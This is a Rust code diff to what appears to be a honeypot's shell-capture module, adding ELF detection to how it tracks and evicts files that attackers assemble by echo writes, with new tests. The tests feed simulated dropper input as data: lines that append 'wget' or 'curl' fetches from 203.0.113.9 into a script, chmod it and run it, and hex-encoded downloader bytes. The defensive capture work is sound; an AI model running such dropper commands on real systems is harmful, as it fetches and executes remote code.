@@ -449,6 +449,17 @@ pub(crate) struct TrackedFile {
     pub len: u64,
     pub chunk_count: u32,
     pub command: String,
+    /// Whether the first chunk began with the ELF magic: a one-line binary is a program however
+    /// few writes built it.
+    pub elf: bool,
+}
+
+impl TrackedFile {
+    /// Whether the session's end would skip this file: too few chunks to be an upload, and no
+    /// program.
+    pub(crate) fn is_dead(&self) -> bool {
+        self.chunk_count < MIN_UNRUN_CHUNKS && !self.elf
+    }
 }
 
 /// One distinct body and how many times the session sent it.
@@ -533,11 +544,7 @@ impl StdinCaptures {
                 *known = file;
             } else if set.tracked.len() < MAX_TRACKED_FILES {
                 set.tracked.push(file);
-            } else if let Some(dead) = set
-                .tracked
-                .iter()
-                .position(|t| t.chunk_count < MIN_UNRUN_CHUNKS)
-            {
+            } else if let Some(dead) = set.tracked.iter().position(TrackedFile::is_dead) {
                 // Full of files the end of the session would skip: the oldest of them makes
                 // room, so a sweep of write probes cannot hide the assembly typed after it.
                 set.tracked.remove(dead);
@@ -651,7 +658,7 @@ impl CaptureSet {
         };
         let end = UploadEnd::Session(self.session_end);
         for file in std::mem::take(&mut self.tracked) {
-            if file.chunk_count < MIN_UNRUN_CHUNKS {
+            if file.is_dead() {
                 continue;
             }
             let Ok(bytes) = fs.read_all(&file.path, READ_CAP) else {
@@ -1140,17 +1147,22 @@ mod tests {
         assert_eq!(meta["destination"], "/data/p23/.d");
     }
 
-    /// A bare `echo > f` leaves a newline: a write probe, no start of an assembly, so it takes no
-    /// slot; a file that starts with real bytes does.
+    /// A bare `echo > f` leaves a newline: a write probe, tracked as a dead one-chunk record so a
+    /// later append continues it and a full table can drop it.
     #[tokio::test]
-    async fn a_bare_echo_redirect_does_not_start_an_assembly() {
+    async fn a_bare_echo_redirect_is_a_dead_one_chunk_record() {
         let dir = tempfile::tempdir().unwrap();
         let captures = StdinCaptures::new(handoff(dir.path()), source());
         let mut shell = loader_shell(&captures);
         shell.handle_input("echo > /tmp/probe");
-        shell.handle_input("echo -ne 'ab' > /tmp/real");
-        assert!(!shell.is_assembled("/tmp/probe"));
-        assert!(shell.is_assembled("/tmp/real"));
+        assert!(shell.is_assembled("/tmp/probe"));
+        for index in 0..20 {
+            shell.handle_input(format!("echo -ne 'n{index}' > /tmp/note{index}"));
+        }
+        assert!(
+            !shell.is_assembled("/tmp/probe"),
+            "the probe is evicted first"
+        );
     }
 
     /// A script dropper starts with a bare `echo > f` and grows the file by appends. The newline
@@ -1162,10 +1174,6 @@ mod tests {
         let captures = StdinCaptures::new(handoff.clone(), source());
         let mut shell = loader_shell(&captures);
         shell.handle_input("echo > /tmp/s");
-        assert!(
-            !shell.is_assembled("/tmp/s"),
-            "the probe alone is no assembly"
-        );
         shell.handle_input("echo 'cd /tmp' >> /tmp/s");
         shell.handle_input("echo 'wget http://203.0.113.9/x' >> /tmp/s");
         shell.handle_input("chmod +x /tmp/s");
@@ -1182,18 +1190,138 @@ mod tests {
         assert_eq!(meta["end_reason"], "transfer_complete");
     }
 
-    /// A truncating `echo > f` over a tracked file drops the stale record, so it does not hold a
-    /// slot that eviction cannot free.
+    /// A truncating `echo > f` over a tracked file replaces its record, in the shell's table and
+    /// in the session's list alike: the next line must not bring the stale record back, and the
+    /// appends that follow are tracked from the newline.
     #[tokio::test]
     async fn a_bare_echo_over_a_tracked_file_drops_its_record() {
         let dir = tempfile::tempdir().unwrap();
-        let captures = StdinCaptures::new(handoff(dir.path()), source());
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
         let mut shell = loader_shell(&captures);
         let chunks = upload_chunks(&mut shell, "/tmp/.d", &DOWNLOADER[..24]);
         assert_eq!(chunks, 3);
         assert!(shell.is_assembled("/tmp/.d"));
         shell.handle_input("echo > /tmp/.d");
-        assert!(!shell.is_assembled("/tmp/.d"));
+        shell.handle_input("echo one >> /tmp/.d");
+        let (_, line_events) = shell.handle_input("echo two >> /tmp/.d");
+        assert_eq!(line_events[0].metadata["chunk_index"], 3, "{line_events:?}");
+        captures.end_session(CaptureEnd::PeerClosed);
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        let events = events(dir.path());
+        assert_eq!(events.len(), 1, "{events:?}");
+        assert_eq!(events[0]["metadata"]["chunk_count"], 3);
+        assert_eq!(events[0]["metadata"]["size"], 1 + 4 + 4);
+    }
+
+    /// Drive `lines` through a fresh loader shell and return the echo_loader captures.
+    async fn loader_captures(lines: &[String]) -> Vec<serde_json::Value> {
+        let dir = tempfile::tempdir().unwrap();
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
+        let mut shell = loader_shell(&captures);
+        for line in lines {
+            shell.handle_input(line.clone());
+        }
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        events(dir.path())
+    }
+
+    fn probes(count: usize) -> Vec<String> {
+        (0..count)
+            .map(|index| format!("mkdir -p /data/p{index}"))
+            .chain(
+                (0..count).map(|index| format!("echo > /data/p{index}/.b && sh /data/p{index}/.b")),
+            )
+            .collect()
+    }
+
+    /// Case G: a three-chunk file, a bare `echo > f` over it, two appends, chmod, run. The
+    /// stale record must not outlive the truncation: one capture, of the new content.
+    #[tokio::test]
+    async fn a_dropper_rebuilt_over_a_tracked_path_is_captured_whole() {
+        let mut lines = Vec::new();
+        for (index, chunk) in DOWNLOADER[..24].chunks(8).enumerate() {
+            let text: String = chunk.iter().map(|b| format!("\\x{b:02x}")).collect();
+            let op = if index == 0 { ">" } else { ">>" };
+            lines.push(format!("echo -ne '{text}' {op} /tmp/r"));
+        }
+        lines.extend(
+            [
+                "echo > /tmp/r",
+                "echo 'cd /tmp' >> /tmp/r",
+                "echo 'wget x' >> /tmp/r",
+            ]
+            .map(String::from),
+        );
+        lines.extend(["chmod +x /tmp/r", "/tmp/r"].map(String::from));
+        let events = loader_captures(&lines).await;
+        assert_eq!(events.len(), 1, "{events:?}");
+        assert_eq!(events[0]["metadata"]["chunk_count"], 3);
+        assert_eq!(events[0]["metadata"]["size"], 1 + 8 + 7);
+    }
+
+    /// Case G2: a bare-echo script dropper run twice at one path with different bodies is two
+    /// samples.
+    #[tokio::test]
+    async fn a_script_dropper_rebuilt_at_one_path_is_captured_each_time() {
+        let mut lines = Vec::new();
+        for fetch in ["wget http://203.0.113.9/x", "curl http://203.0.113.9/x"] {
+            lines.push("echo > /tmp/s".to_string());
+            lines.push("echo 'cd /tmp' >> /tmp/s".to_string());
+            lines.push(format!("echo '{fetch}' >> /tmp/s"));
+            lines.push("chmod +x /tmp/s".to_string());
+            lines.push("/tmp/s".to_string());
+        }
+        let events = loader_captures(&lines).await;
+        assert_eq!(events.len(), 2, "{events:?}");
+    }
+
+    /// Case E: a probe sweep, then a bare-echo script dropper.
+    #[tokio::test]
+    async fn a_script_dropper_after_a_probe_sweep_is_captured() {
+        let mut lines = probes(24);
+        lines.extend(
+            [
+                "echo > /tmp/s",
+                "echo 'cd /tmp' >> /tmp/s",
+                "echo 'wget x' >> /tmp/s",
+                "chmod +x /tmp/s",
+                "/tmp/s",
+            ]
+            .map(String::from),
+        );
+        let events = loader_captures(&lines).await;
+        assert_eq!(events.len(), 1, "{events:?}");
+        assert_eq!(events[0]["metadata"]["destination"], "/tmp/s");
+    }
+
+    /// Case D: a 200-byte ELF typed in one line is a program however few writes built it, so a
+    /// probe sweep after it evicts probes, not the ELF.
+    #[tokio::test]
+    async fn a_one_line_elf_survives_a_probe_sweep() {
+        let mut elf = DOWNLOADER.to_vec();
+        elf.resize(200, 0xa5);
+        let text: String = elf.iter().map(|b| format!("\\x{b:02x}")).collect();
+        let mut lines = vec![format!("echo -ne '{text}' > /tmp/e")];
+        lines.extend(probes(16));
+        lines.extend(["chmod +x /tmp/e", "/tmp/e"].map(String::from));
+        let events = loader_captures(&lines).await;
+        assert_eq!(events.len(), 1, "{events:?}");
+        assert_eq!(events[0]["metadata"]["destination"], "/tmp/e");
+        assert_eq!(events[0]["metadata"]["size"], 200);
+    }
+
+    /// Case F: a bare echo and one append, never run, is taken when the session ends.
+    #[tokio::test]
+    async fn a_bare_echo_and_one_append_never_run_is_captured_at_the_end() {
+        let lines = ["echo > /tmp/f", "echo 'wget x' >> /tmp/f"].map(String::from);
+        let events = loader_captures(&lines).await;
+        assert_eq!(events.len(), 1, "{events:?}");
     }
 
     /// Probes the shell has evicted from its own table stay in the session's list; the list makes
